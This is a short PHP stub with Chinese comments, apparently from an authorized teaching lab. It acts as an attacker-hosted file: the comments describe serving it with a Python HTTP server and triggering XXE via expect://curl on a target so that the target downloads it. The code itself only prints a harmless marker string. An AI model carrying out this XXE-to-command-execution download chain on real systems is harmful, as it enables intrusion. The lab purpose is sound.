<?php
/**
 * 授权教学环境专用：模拟「攻击机托管」的下载文件。
 * 在考试机/攻击机上与本文件同目录执行：python3 -m http.server 9999
 * 靶机 XXE 触发 expect://curl ... 后，若成功，可在目标机侧验证是否下载到 Web 目录等位置。
 *
 * 请勿用于未授权系统。
 */
header('Content-Type: text/plain; charset=UTF-8');
echo "lab_demo_payload_ok\n";
